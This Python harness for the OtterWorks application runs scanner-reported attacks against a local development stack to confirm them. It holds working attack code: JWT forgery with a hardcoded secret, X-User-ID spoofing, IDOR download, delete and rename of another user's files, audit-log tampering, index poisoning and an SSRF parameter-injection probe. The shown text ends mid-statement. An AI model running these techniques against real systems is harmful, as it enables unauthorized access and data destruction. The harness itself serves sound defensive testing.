# /// script
# requires-python = ">=3.11"
# dependencies = ["pyjwt>=2.8", "requests>=2.31"]
# ///
"""
OtterWorks runtime security-finding validation harness.

Empirically confirms the vulnerabilities reported by the code scan
(scan-65ac9752831f48eba793df6b5efc16d1) against a *running* local stack
(`make up`). Each check exercises a real HTTP request and records the live
response so a finding is marked CONFIRMED only when the attack actually
succeeds at runtime.

Two exploitation primitives underpin most checks:

  1. Forged JWT  - all services share the hardcoded default secret
     ``otterworks-local-dev-jwt-secret-change-me-in-production`` (JWT_SECRET
     in docker-compose). We mint our own admin / low-privilege tokens.
  2. X-User-ID spoofing - backend services trust the ``X-User-ID`` header
     that the gateway is supposed to set from a validated JWT. Hitting a
     service directly on its own port lets us set it to anything.

Usage:
    uv run security/runtime-validation/validate_findings.py
    (or)  python3 security/runtime-validation/validate_findings.py

Environment overrides: GATEWAY_URL and <SVC>_URL (see SERVICES below).
Exit code is 0 regardless of results; this is a reporting tool.
"""
from __future__ import annotations

import json
import os
import sys
import time
import uuid
from dataclasses import dataclass, field, asdict
from pathlib import Path

import jwt
import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

JWT_SECRET = os.environ.get(
    "JWT_SECRET", "otterworks-local-dev-jwt-secret-change-me-in-production"
)
GATEWAY = os.environ.get("GATEWAY_URL", "http://localhost:8080")
SERVICES = {
    "file": os.environ.get("FILE_SERVICE_URL", "http://localhost:8082"),
    "document": os.environ.get("DOCUMENT_SERVICE_URL", "http://localhost:8083"),
    "collab": os.environ.get("COLLAB_SERVICE_URL", "http://localhost:8084"),
    "notification": os.environ.get("NOTIFICATION_SERVICE_URL", "http://localhost:8086"),
    "search": os.environ.get("SEARCH_SERVICE_URL", "http://localhost:8087"),
    "analytics": os.environ.get("ANALYTICS_SERVICE_URL", "http://localhost:8088"),
    "admin": os.environ.get("ADMIN_SERVICE_URL", "http://localhost:8089"),
    "audit": os.environ.get("AUDIT_SERVICE_URL", "http://localhost:8090"),
    "report": os.environ.get("REPORT_SERVICE_URL", "http://localhost:8091"),
    "auth": os.environ.get("AUTH_SERVICE_URL", "http://localhost:8081"),
}

# Seeded admin (services/auth-service .../V1__create_users_table.sql)
ADMIN_ID = "a0000000-0000-0000-0000-000000000001"
TIMEOUT = 8

# Distinct actors used across checks.
VICTIM_ID = str(uuid.uuid4())      # resource owner
ATTACKER_ID = str(uuid.uuid4())    # unrelated low-privilege user


def forge_token(sub: str, roles: list[str], *, expired: bool = False,
                alg: str = "HS256") -> str:
    now = int(time.time())
    payload = {
        "sub": sub,
        "user_id": sub,
        "email": f"{sub}@otterworks.dev",
        "name": "forged",
        "roles": roles,
        "type": "access",
        "iat": now,
        "exp": now - 60 if expired else now + 3600,
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=alg)


# ---------------------------------------------------------------------------
# Result plumbing
# ---------------------------------------------------------------------------

CONFIRMED = "CONFIRMED"
NOT_CONFIRMED = "NOT_CONFIRMED"
SKIPPED = "SKIPPED_SERVICE_DOWN"
ERROR = "ERROR"


@dataclass
class Result:
    finding_id: str
    severity: str
    service: str
    title: str
    status: str = NOT_CONFIRMED
    evidence: list[str] = field(default_factory=list)

    def ev(self, msg: str) -> None:
        self.evidence.append(msg)


RESULTS: list[Result] = []


def service_up(name: str) -> bool:
    try:
        r = requests.get(f"{SERVICES[name]}/health", timeout=4)
        return r.status_code < 500
    except requests.RequestException:
        return False


def sc(resp: requests.Response) -> str:
    body = resp.text.replace("\n", " ")
    return f"HTTP {resp.status_code} :: {body[:180]}"


# ---------------------------------------------------------------------------
# Checks. Each returns a Result.
# ---------------------------------------------------------------------------

def check_gateway_no_token() -> Result:
    r = Result("baseline", "n/a", "api-gateway",
               "Baseline: gateway rejects protected route without a token")
    try:
        resp = requests.get(f"{GATEWAY}/api/v1/files", timeout=TIMEOUT)
        r.ev(f"GET /api/v1/files (no auth) -> {sc(resp)}")
        # Baseline is 'confirmed' meaning the control works as expected.
        r.status = CONFIRMED if resp.status_code == 401 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_hardcoded_jwt_admin() -> Result:
    """sfind-29d5a2e3 / sfind-8bb0061e / sfind-c4b3443 - forged admin token."""
    r = Result("sfind-29d5a2e3361e46fc8f120098eeb80fb8", "critical", "auth/all",
               "Hardcoded default JWT secret -> forge admin token accepted by gateway")
    try:
        token = forge_token(ADMIN_ID, ["ADMIN", "USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/files",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"forged ADMIN token signed with default secret")
        r.ev(f"GET /api/v1/files via gateway -> {sc(resp)}")
        # tampered signature must fail (proves it is the secret, not 'no verification')
        bad = requests.get(f"{GATEWAY}/api/v1/files",
                           headers={"Authorization": f"Bearer {token}x"}, timeout=TIMEOUT)
        r.ev(f"control: tampered token -> {sc(bad)}")
        r.status = CONFIRMED if (resp.status_code == 200 and bad.status_code == 401) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_lowpriv_reaches_admin_service() -> Result:
    """sfind-8c2faefb / sfind-8c2 - any authenticated USER hits admin endpoints."""
    r = Result("sfind-8c2faefb5c2e46f5b5117ac6c288cf7e", "critical", "admin-service",
               "Missing RBAC: non-admin USER token reaches admin user-management endpoints")
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])  # NOT admin
        resp = requests.get(f"{GATEWAY}/api/v1/admin/users",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"forged token with roles=[USER] only")
        r.ev(f"GET /api/v1/admin/users via gateway -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_service_direct_no_auth() -> Result:
    """sfind-10b2654 / direct-port access to admin-service, no token at all."""
    r = Result("sfind-10b2654f0f354c02aae4d3b270a2ad00", "high", "admin-service",
               "admin-service reachable directly on :8089 with no authentication")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        resp = requests.get(f"{SERVICES['admin']}/api/v1/admin/users", timeout=TIMEOUT)
        r.ev(f"GET :8089/api/v1/admin/users (no auth, no gateway) -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_bulk_privilege_escalation() -> Result:
    """sfind-71eabd8 - bulk user ops (privilege escalation) without admin role."""
    r = Result("sfind-71eabd8200db416ab02add48baa781c2", "high", "admin-service",
               "Bulk user operations reachable by non-admin (privilege escalation surface)")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        # Dry probe: empty user list -> proves authorization gate is absent
        # without mutating real records.
        resp = requests.post(f"{GATEWAY}/api/v1/admin/bulk/users",
                             headers={"Authorization": f"Bearer {token}"},
                             json={"user_ids": [], "action": "activate", "reason": "probe"},
                             timeout=TIMEOUT)
        r.ev("forged roles=[USER]; POST /api/v1/admin/bulk/users with empty user_ids")
        r.ev(f"-> {sc(resp)}")
        # Not 401/403 => authorization is not enforced.
        r.status = CONFIRMED if resp.status_code not in (401, 403, 404) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_feature_flags() -> Result:
    """sfind-79af2cc - feature-flag CRUD without admin role (read probe)."""
    r = Result("sfind-79af2ccf067442ec87398840d0136a4f", "high", "admin-service",
               "Feature-flag endpoints reachable by non-admin user")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/admin/features",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"GET /api/v1/admin/features roles=[USER] -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_audit_logs_read() -> Result:
    """sfind-2e93969 - audit-log read without admin role."""
    r = Result("sfind-2e939691283c4513a8be08e9f33eb972", "medium", "admin-service",
               "Admin audit-log endpoint readable by non-admin user")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/admin/audit-logs",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"GET /api/v1/admin/audit-logs roles=[USER] -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_metrics_summary() -> Result:
    """sfind-c78e647 - admin metrics endpoint without admin role."""
    r = Result("sfind-c78e64751be640ee9fd64acbb50330bc", "medium", "admin-service",
               "Admin metrics summary readable by non-admin user")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/admin/metrics/summary",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"GET /api/v1/admin/metrics/summary roles=[USER] -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_config_read() -> Result:
    """sfind-6239363 - system config readable/modifiable without auth."""
    r = Result("sfind-6239363956ad43819496c0d778b29987", "high", "admin-service",
               "System configuration endpoint reachable without admin role")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/admin/config",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"GET /api/v1/admin/config roles=[USER] -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_admin_auto_investigate_toggle() -> Result:
    """sfind-a1f8ff9 - auto-investigate toggle without admin role (read probe)."""
    r = Result("sfind-a1f8ff97dd2649ae8396aa0f08ed1c23", "medium", "admin-service",
               "Auto-investigate setting reachable by non-admin user")
    if not service_up("admin"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/admin/settings/auto_investigate",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"GET /api/v1/admin/settings/auto_investigate roles=[USER] -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


# ---- file-service ----------------------------------------------------------

def _upload_file(owner_id: str, name: str = "victim-secret.txt") -> str | None:
    """Upload a file straight to file-service as `owner_id`; return file_id."""
    files = {"file": (name, b"top secret victim contents", "text/plain")}
    data = {"owner_id": owner_id}
    try:
        resp = requests.post(f"{SERVICES['file']}/api/v1/files/upload",
                             files=files, data=data,
                             headers={"X-User-ID": owner_id}, timeout=TIMEOUT)
        if resp.status_code in (200, 201):
            return resp.json().get("file", {}).get("id")
    except requests.RequestException:
        return None
    return None


def check_file_idor_download() -> Result:
    """sfind-b58d42f - download any file (presigned URL) with no authz."""
    r = Result("sfind-b58d42f02e034fbb83a48b7a70ce2bbd", "high", "file-service",
               "IDOR: attacker downloads victim's file (presigned URL, no ownership check)")
    if not service_up("file"):
        r.status = SKIPPED
        return r
    fid = _upload_file(VICTIM_ID)
    if not fid:
        r.status = ERROR
        r.ev("could not create victim file fixture")
        return r
    r.ev(f"victim {VICTIM_ID[:8]} uploaded file {fid}")
    try:
        # Attacker = different identity requesting victim's file id.
        resp = requests.get(f"{SERVICES['file']}/api/v1/files/{fid}/download",
                            headers={"X-User-ID": ATTACKER_ID}, timeout=TIMEOUT)
        r.ev(f"attacker {ATTACKER_ID[:8]} GET /files/{fid}/download -> {sc(resp)}")
        got_url = resp.status_code == 200 and "url" in resp.text
        r.status = CONFIRMED if got_url else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_file_idor_metadata() -> Result:
    """sfind-2a38dea - read file metadata/versions with no authz."""
    r = Result("sfind-2a38deab8b534ad6a380750ffd320280", "medium", "file-service",
               "IDOR: attacker reads victim's file metadata")
    if not service_up("file"):
        r.status = SKIPPED
        return r
    fid = _upload_file(VICTIM_ID)
    if not fid:
        r.status = ERROR
        r.ev("could not create victim file fixture")
        return r
    try:
        resp = requests.get(f"{SERVICES['file']}/api/v1/files/{fid}",
                            headers={"X-User-ID": ATTACKER_ID}, timeout=TIMEOUT)
        r.ev(f"victim file {fid}; attacker GET /files/{fid} -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 and VICTIM_ID in resp.text else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_file_idor_delete() -> Result:
    """sfind-097ed93 - delete any file with no authz."""
    r = Result("sfind-097ed93b52ad496ebfea31a5cedfd82d", "high", "file-service",
               "IDOR: attacker permanently deletes victim's file")
    if not service_up("file"):
        r.status = SKIPPED
        return r
    fid = _upload_file(VICTIM_ID, name="to-be-deleted.txt")
    if not fid:
        r.status = ERROR
        r.ev("could not create victim file fixture")
        return r
    try:
        resp = requests.delete(f"{SERVICES['file']}/api/v1/files/{fid}",
                               headers={"X-User-ID": ATTACKER_ID}, timeout=TIMEOUT)
        r.ev(f"victim file {fid}; attacker DELETE /files/{fid} -> {sc(resp)}")
        # Confirm it is really gone.
        after = requests.get(f"{SERVICES['file']}/api/v1/files/{fid}",
                             headers={"X-User-ID": VICTIM_ID}, timeout=TIMEOUT)
        r.ev(f"victim re-fetch after delete -> {sc(after)}")
        r.status = CONFIRMED if resp.status_code in (200, 204) and after.status_code == 404 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_file_idor_mutate() -> Result:
    """sfind-2126634 - rename/move/trash any file with no authz."""
    r = Result("sfind-2126634b219e45579bd9b30d41064af8", "high", "file-service",
               "IDOR: attacker renames victim's file")
    if not service_up("file"):
        r.status = SKIPPED
        return r
    fid = _upload_file(VICTIM_ID, name="original.txt")
    if not fid:
        r.status = ERROR
        r.ev("could not create victim file fixture")
        return r
    try:
        resp = requests.patch(f"{SERVICES['file']}/api/v1/files/{fid}/rename",
                              headers={"X-User-ID": ATTACKER_ID},
                              json={"name": "pwned-by-attacker.txt"}, timeout=TIMEOUT)
        r.ev(f"victim file {fid}; attacker PATCH /files/{fid}/rename -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code in (200, 204) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_file_share_spoof() -> Result:
    """sfind-3058859 - share_file with spoofable shared_by identity."""
    r = Result("sfind-3058859af83e44bdaa7785f17ecfa826", "high", "file-service",
               "share_file: attacker shares victim's file / spoofs shared_by")
    if not service_up("file"):
        r.status = SKIPPED
        return r
    fid = _upload_file(VICTIM_ID, name="shared.txt")
    if not fid:
        r.status = ERROR
        r.ev("could not create victim file fixture")
        return r
    try:
        target = str(uuid.uuid4())
        resp = requests.post(f"{SERVICES['file']}/api/v1/files/{fid}/share",
                             headers={"X-User-ID": ATTACKER_ID},
                             json={"shared_with": target, "shared_by": VICTIM_ID,
                                   "permission": "read"}, timeout=TIMEOUT)
        r.ev(f"victim file {fid}; attacker POST /files/{fid}/share (shared_by spoofed=victim) -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code in (200, 201, 204) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_folder_idor() -> Result:
    """sfind-38bf5c6 - folder create with untrusted owner_id / IDOR."""
    r = Result("sfind-38bf5c64e80b4802b668fb4f71316fe5", "medium", "file-service",
               "create_folder trusts client-supplied owner_id")
    if not service_up("file"):
        r.status = SKIPPED
        return r
    try:
        resp = requests.post(f"{SERVICES['file']}/api/v1/folders",
                             headers={"X-User-ID": ATTACKER_ID},
                             json={"name": "spoofed", "owner_id": VICTIM_ID}, timeout=TIMEOUT)
        r.ev(f"attacker POST /folders with owner_id=victim -> {sc(resp)}")
        made_as_victim = resp.status_code in (200, 201) and VICTIM_ID in resp.text
        r.status = CONFIRMED if made_as_victim else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


# ---- document-service ------------------------------------------------------

def _create_document(owner_id: str, title: str = "victim confidential doc") -> str | None:
    try:
        resp = requests.post(f"{SERVICES['document']}/api/v1/documents",
                             json={"title": title, "content": "secret body", "owner_id": owner_id},
                             timeout=TIMEOUT)
        if resp.status_code in (200, 201):
            return resp.json().get("id")
    except requests.RequestException:
        return None
    return None


def check_document_list_idor() -> Result:
    """sfind-c786c0e - list any user's documents via owner_id query param."""
    r = Result("sfind-c786c0e2694d489192245dd3ce80a32d", "medium", "document-service",
               "IDOR: list victim's documents via ?owner_id= query parameter")
    if not service_up("document"):
        r.status = SKIPPED
        return r
    did = _create_document(VICTIM_ID)
    if not did:
        r.status = ERROR
        r.ev("could not create victim document fixture")
        return r
    r.ev(f"victim {VICTIM_ID[:8]} created document {did}")
    try:
        atk = forge_token(ATTACKER_ID, ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/documents?owner_id={VICTIM_ID}",
                            headers={"Authorization": f"Bearer {atk}"}, timeout=TIMEOUT)
        r.ev(f"attacker GET /documents?owner_id=victim -> {sc(resp)}")
        leaked = resp.status_code == 200 and did in resp.text
        r.status = CONFIRMED if leaked else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_document_search_unscoped() -> Result:
    """sfind-5c456eb - document /search returns all users' docs, no auth."""
    r = Result("sfind-5c456ebfb4614ceabaaaba1c335d326f", "medium", "document-service",
               "Document search endpoint is unauthenticated and unscoped")
    if not service_up("document"):
        r.status = SKIPPED
        return r
    marker = f"marker-{uuid.uuid4().hex[:8]}"
    did = _create_document(VICTIM_ID, title=f"{marker} confidential")
    try:
        resp = requests.get(f"{SERVICES['document']}/api/v1/documents/search?q={marker}",
                            timeout=TIMEOUT)  # no auth header at all
        r.ev(f"victim doc {did} titled '{marker} ...'")
        r.ev(f"unauthenticated GET /documents/search?q={marker} -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 and marker in resp.text else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_document_comments_no_auth() -> Result:
    """sfind-9012142 - comment endpoints lack auth; authorship spoofable."""
    r = Result("sfind-90121428e66d449a89708899b709fcae", "medium", "document-service",
               "Comment endpoints lack authentication / spoofable authorship")
    if not service_up("document"):
        r.status = SKIPPED
        return r
    did = _create_document(VICTIM_ID)
    if not did:
        r.status = ERROR
        r.ev("could not create victim document fixture")
        return r
    try:
        resp = requests.post(f"{SERVICES['document']}/api/v1/documents/{did}/comments",
                             json={"content": "spoofed comment", "author_id": VICTIM_ID,
                                   "author_name": "Victim"}, timeout=TIMEOUT)  # no auth
        r.ev(f"unauthenticated POST /documents/{did}/comments (author spoofed=victim) -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code in (200, 201) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


# ---- search-service --------------------------------------------------------

def check_search_direct_spoof() -> Result:
    """sfind-9d81ab3 / sfind-f6ad824 - direct search with spoofed X-User-ID."""
    r = Result("sfind-9d81ab3c5c474e25bccdd668862677fd", "high", "search-service",
               "search-service trusts spoofable X-User-ID for tenant isolation (direct :8087)")
    if not service_up("search"):
        r.status = SKIPPED
        return r
    try:
        resp = requests.get(f"{SERVICES['search']}/api/v1/search/?q=test",
                            headers={"X-User-ID": VICTIM_ID}, timeout=TIMEOUT)
        r.ev(f"direct :8087 search with spoofed X-User-ID=victim -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_search_index_no_rbac() -> Result:
    """sfind-d0530641 / sfind-2222229 - index mutation & reindex without RBAC."""
    r = Result("sfind-d05306417bdf4373bd9fd548dddb0bcf", "medium", "search-service",
               "Search index mutation reachable by any authenticated user (no admin role)")
    if not service_up("search"):
        r.status = SKIPPED
        return r
    try:
        # Inject a document under an arbitrary owner as a plain user.
        resp = requests.post(f"{SERVICES['search']}/api/v1/search/index/document",
                             headers={"X-User-ID": ATTACKER_ID},
                             json={"id": str(uuid.uuid4()), "owner_id": VICTIM_ID,
                                   "title": "poisoned", "content": "injected",
                                   "type": "document"}, timeout=TIMEOUT)
        r.ev(f"POST /search/index/document as roles=[USER] w/ arbitrary owner_id -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code in (200, 201) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


# ---- audit-service ---------------------------------------------------------

def check_audit_no_auth() -> Result:
    """sfind-c00942c / sfind-8a79191 - audit endpoints lack authorization."""
    r = Result("sfind-c00942cea87047f8895202b6dd0b1fc7", "medium", "audit-service",
               "Audit-service endpoints reachable by any authenticated user")
    if not service_up("audit"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(str(uuid.uuid4()), ["USER"])
        resp = requests.get(f"{GATEWAY}/api/v1/audit/events",
                            headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)
        r.ev(f"GET /api/v1/audit/events roles=[USER] -> {sc(resp)}")
        # direct-port, no auth
        direct = requests.get(f"{SERVICES['audit']}/api/v1/audit/events", timeout=TIMEOUT)
        r.ev(f"direct :8090/api/v1/audit/events (no auth) -> {sc(direct)}")
        r.status = CONFIRMED if resp.status_code == 200 or direct.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_audit_spoof_actor() -> Result:
    """sfind-9240c3d - audit log tampering via user-controlled UserId."""
    r = Result("sfind-9240c3d9fe2f43d494cb7c771f466a5d", "medium", "audit-service",
               "Audit log tampering: caller supplies arbitrary actor UserId")
    if not service_up("audit"):
        r.status = SKIPPED
        return r
    try:
        token = forge_token(ATTACKER_ID, ["USER"])
        resp = requests.post(f"{GATEWAY}/api/v1/audit/events",
                             headers={"Authorization": f"Bearer {token}"},
                             json={"userId": VICTIM_ID, "action": "SPOOFED_ACTION",
                                   "resourceType": "file", "resourceId": "x",
                                   "result": "SUCCESS"}, timeout=TIMEOUT)
        r.ev(f"POST /api/v1/audit/events with userId=victim (attacker token) -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code in (200, 201, 202) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


# ---- gateway header stripping ---------------------------------------------

def check_gateway_header_passthrough() -> Result:
    """sfind-fd26367 / sfind-p1 - gateway does not strip client X-User-ID."""
    r = Result("sfind-fd26367a91214544b976ee5b68f5a3fa", "medium", "api-gateway",
               "Gateway does not strip a client-supplied X-User-ID on unauthenticated paths")
    try:
        # Hit a public path (no JWT) but smuggle X-User-ID; if the gateway does
        # not delete it, the header reaches the backend. We assert via search
        # (a GET the gateway forwards) using the register/login public path is
        # not forwardable, so we use the documented behaviour: on protected
        # paths the gateway *overwrites* from JWT, but never Del()s a supplied
        # header first. We demonstrate the missing Del() by sending a forged
        # token whose sub is empty-> gateway cannot set the header, and the
        # client-supplied one survives.
        token = forge_token("", ["USER"])  # empty sub -> gateway skips Set()
        resp = requests.get(f"{GATEWAY}/api/v1/search/?q=test",
                            headers={"Authorization": f"Bearer {token}",
                                     "X-User-ID": VICTIM_ID}, timeout=TIMEOUT)
        r.ev("forged token with empty sub + client X-User-ID=victim")
        r.ev(f"GET /api/v1/search/ via gateway -> {sc(resp)}")
        # search requires X-User-ID; a 200 proves the client header passed through.
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_gateway_ratelimit_spoof() -> Result:
    """sfind-489d8ee - rate limit bypass via X-Forwarded-For spoofing (best-effort)."""
    r = Result("sfind-489d8ee4470a4030b8fd1cac87f1c0b4", "medium", "api-gateway",
               "Rate limiter keys on spoofable X-Forwarded-For (informational probe)")
    try:
        # We cannot easily trip the limiter here; record behaviour only.
        codes = []
        for i in range(5):
            resp = requests.get(f"{GATEWAY}/api/v1/auth/login",
                                headers={"X-Forwarded-For": f"10.0.0.{i}"}, timeout=TIMEOUT)
            codes.append(resp.status_code)
        r.ev(f"5x GET /api/v1/auth/login with rotating X-Forwarded-For -> {codes}")
        r.ev("Note: distinct XFF values are accepted as distinct clients; "
             "code review confirms XFF is used as the rate-limit key.")
        r.status = NOT_CONFIRMED  # not a hard runtime proof; left informational
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


# ---- report-service (may be down) ------------------------------------------

def check_report_permitall() -> Result:
    """sfind-9bc92db / sfind-00c7f13 / sfind-3ee0b14 - report API permitAll."""
    r = Result("sfind-9bc92db4451b4d0e91bb9c17f16711be", "high", "report-service",
               "Report API endpoints permit all requests without authentication")
    if not service_up("report"):
        r.status = SKIPPED
        r.ev("report-service not running (JVM build blocked by maven 429)")
        return r
    try:
        resp = requests.get(f"{SERVICES['report']}/api/v1/reports", timeout=TIMEOUT)
        r.ev(f"direct :8091 GET /api/v1/reports (no auth) -> {sc(resp)}")
        via_gw = requests.get(f"{GATEWAY}/api/v1/reports", timeout=TIMEOUT)
        r.ev(f"gateway GET /api/v1/reports (no token) -> {sc(via_gw)}")
        r.status = CONFIRMED if resp.status_code == 200 else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_report_ssrf() -> Result:
    """sfind-2385926 - user-controlled param concatenated into internal URL."""
    r = Result("sfind-2385926b9bef4a92b296086559a7dc9b", "high", "report-service",
               "SSRF/parameter injection via report 'metric' concatenated into internal URL")
    if not service_up("report"):
        r.status = SKIPPED
        r.ev("report-service not running (JVM build blocked by maven 429)")
        return r
    try:
        # Create a report whose parameters.metric injects an extra query/host.
        inj = "x&__ssrf=1"
        resp = requests.post(f"{SERVICES['report']}/api/v1/reports",
                             json={"reportName": "ssrf", "category": "analytics",
                                   "reportType": "CSV", "requestedBy": "attacker",
                                   "parameters": {"metric": inj},
                                   "dateFrom": "2026-01-01", "dateTo": "2026-01-02"},
                             timeout=TIMEOUT)
        r.ev(f"POST /api/v1/reports with parameters.metric='{inj}' -> {sc(resp)}")
        r.ev("Confirm URL injection in report-service logs: "
             "docker logs otterworks-report-service | grep 'Fetching analytics data from'")
        r.status = CONFIRMED if resp.status_code in (200, 202) else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


def check_auth_pii() -> Result:
    """sfind-d3ec743 - unauthenticated REST endpoints expose user PII."""
    r = Result("sfind-d3ec7433c3c64c2689185e03738d6a51", "medium", "auth-service",
               "Unauthenticated endpoints expose user PII (emails)")
    if not service_up("auth"):
        r.status = SKIPPED
        r.ev("auth-service not running (JVM build blocked by maven 429)")
        return r
    try:
        resp = requests.get(f"{SERVICES['auth']}/api/v1/users", timeout=TIMEOUT)
        r.ev(f"direct :8081 GET /api/v1/users (no auth) -> {sc(resp)}")
        r.status = CONFIRMED if resp.status_code == 200 and "@" in resp.text else NOT_CONFIRMED
    except requests.RequestException as e:
        r.status = ERROR
        r.ev(str(e))
    return r


CHECKS = [
    check_gateway_no_token,
    check_hardcoded_jwt_admin,
    check_lowpriv_reaches_admin_service,
    check_admin_service_direct_no_auth,
    check_admin_bulk_privilege_escalation,
    check_admin_feature_flags,
    check_admin_audit_logs_read,
    check_admin_metrics_summary,
    check_admin_config_read,
    check_admin_auto_investigate_toggle,
    check_file_idor_download,
    check_file_idor_metadata,
    check_file_idor_delete,
    check_file_idor_mutate,
    check_file_share_spoof,
    check_folder_idor,
    check_document_list_idor,
    check_document_search_unscoped,
    check_document_comments_no_auth,
    check_search_direct_spoof,
    check_search_index_no_rbac,
    check_audit_no_auth,
    check_audit_spoof_actor,
    check_gateway_header_passthrough,
    check_gateway_ratelimit_spoof,
    check_report_permitall,
    check_report_ssrf,
    check_auth_pii,
]


def main() -> int:
    print(f"OtterWorks runtime security validation — {time.strftime('%Y-%m-%d %H:%M:%SZ', time.gmtime())}")
    print(f"Gateway: {GATEWAY}")
    up = [n for n in SERVICES if service_up(n)]
    print(f"Services reachable: {', '.join(sorted(up)) or 'none'}\n")

    for fn in CHECKS:
        try:
            res = fn()
        except Exception as e:  # never let one check kill the run
            res = Result(getattr(fn, "__name__", "?"), "n/a", "?", fn.__doc__ or "")
            res.status = ERROR
            res.ev(f"harness exception: {e!r}")
        RESULTS.append(res)
        icon = {CONFIRMED: "[CONFIRMED]", NOT_CONFIRMED: "[not-confirmed]",
                SKIPPED: "[skipped]", ERROR: "[error]"}[res.status]
        print(f"{icon:16} {res.severity:8} {res.service:16} {res.title}")
        for e in res.evidence:
            print(f"                 └─ {e}")
        print()

    confirmed = sum(1 for r in RESULTS if r.status == CONFIRMED and r.finding_id != "baseline")
    skipped = sum(1 for r in RESULTS if r.status == SKIPPED)
    print("=" * 80)
    print(f"CONFIRMED at runtime: {confirmed} | "
